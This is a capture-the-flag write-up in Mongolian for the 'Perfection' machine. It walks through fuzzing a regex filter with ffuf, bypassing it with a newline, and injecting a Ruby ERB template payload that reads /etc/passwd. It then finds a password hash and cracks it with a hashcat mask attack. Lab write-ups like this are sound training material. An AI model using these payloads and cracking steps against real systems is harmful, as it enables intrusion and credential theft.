# Perfection - SSTI Ruby Regex Bypass

Дүн боддог вебсайт байна. Гэхдээ **Ruby 3.0.2 Webrick 1.7.0** хувилбар гэдгийг Burpsuite Response-оос харж болно.

[image]

**Ruby 3.0.2 Webrick 1.7.0**

[image]

Хэрэв category1={{7*7}} буюу SSTI халдлагын жишээг оруулвал.

[image]

Malicious Input blocked буюу Regex аргачлал серверт ажиллаж байгаа юм.

Regex нь a-z,0-9 гэх мэт..

[image]

Тухайн хүсэлтээ ssti.req болгон хадгалж special character-аар bruteforce хийж үзэх гэж байна. Учир нь тухайн Regex whitelist-ийг bypass хийх оролдлого билээ.

[image]

```bash
ffuf -request ssti.req -request-proto http -w <(cat /opt/SecLists/Fuzzing/special-chars.txt | jq -Rr @uri)
```

[image]

[image]

Ер нь бол Newline SSTI-д өртөмтгий байгаа юм. `\n` нь 0A гэсэн ascii char.

[image]

## SSTI

Thats it!

[image]

Одоо payloadAllthething-ээс олсон ruby-руу чиглэсэн SSTI халдлага хийх аргачлал дээр дараах payload-ийг олов. Мөн үүнийгээ URL encode хийсэн.

**`<%= File.open('/etc/passwd').read %>`**

[image]

sqlite3 датабааз байгаа бөгөөд дараах аргыг ашиглан sha256 гэдгийг тогтоож байна.

[image]

**Password but encrypted:** `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`

[image]

```bash
echo abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f | sha256sum | awk '{print$1}' | wc -c
```

[image]

```bash
find / -group susan -type f 2>/dev/null
```

[image]

firstname_firstname backwards_1-->1000000000 хүртэлх wordlist үүсгээд сая олсон хашаа crack хийх юм байна.

[image]

Үүнийг hashcat түүлээр хийж болно.

```bash
hashcat -m 1400 -a 3 hash susan_nasus_?d?d?d?d?d?d?d?d?d
```

[image]
